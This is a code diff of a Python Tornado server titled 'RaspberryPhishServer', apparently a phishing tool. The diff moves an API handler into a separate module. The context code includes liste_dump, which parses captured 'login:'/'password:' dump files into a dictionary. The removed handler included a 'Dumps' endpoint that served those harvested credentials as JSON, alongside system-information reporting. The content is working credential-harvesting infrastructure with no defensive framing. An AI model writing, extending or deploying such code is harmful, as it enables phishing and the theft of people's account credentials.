@@ -4,13 +4,9 @@
 import os
 import ssl
 import time
-import random
-import tornado.ioloop
-import tornado.web
+import tornado.ioloop, tornado.web
 from tornado import gen
-import json
-
-from Modules.UnixSysInfos import *
+from API.APIHandler import APIHandler
 
 
 __title__ = "RaspberryPhishServer"
@@ -27,57 +23,6 @@ def liste_dump(folder):
             path = "./" + root + "/" + dump
             dico[dump] = open(path).read().replace("login:", "").replace("password:", "").split("\n")[:-1]
     return dico
-
-
-# Handler for ressources
-class APIHandler(tornado.web.RequestHandler):
-    def get(self, path_request):
-        #~ print("API:" + str(time.time()) + " GET " + path_request)
-        if path_request == "echo":
-            self.write("API [" + str(time.time()) + "]: GET " + path_request)
-        elif path_request == "random":
-            self.write(str(random.randint(0, 100)))
-        elif path_request == "SystemInfos":
-            self.write(
-                json.dumps(
-                    {
-                        "OS":
-                            {
-                                "Name": OSInfos.os_name(),
-                                "Host": OSInfos.name(),
-                                "Python": OSInfos.python_version(),
-                                "Interpreter": OSInfos.interpreter_name()
-                            },
-                        "CPU":
-                            {
-                                "Type": CpuInfos.cpu_type(),
-                                "Name": CpuInfos.cpu_name(),
-                                "AvgLoad": CpuInfos.avg_load()
-                            },
-                        "RAM":
-                            {
-                                "AvgLoad": RamInfos.avg_load()
-                            },
-                        "STORAGE":
-                            {
-                                "AvgLoad": StorageInfos.avg_load(),
-                                #"IOLoad": StorageInfos.io_load()
-                                "IOLoad": 0
-                            },
-                        "SENSORS":
-                            {
-                                "TEMPS":
-                                    {
-                                        "CPU": SensorInfos.cpu_temp(),
-                                        "MB": SensorInfos.cpu_temp(),
-                                        "GPU": SensorInfos.cpu_temp()
-                                    }
-                            }
-                    }
-                )
-            )
-        elif path_request == "Dumps":
-            self.write(json.dumps(liste_dump("logs/dump")))
 
 
 # Handler for ressources
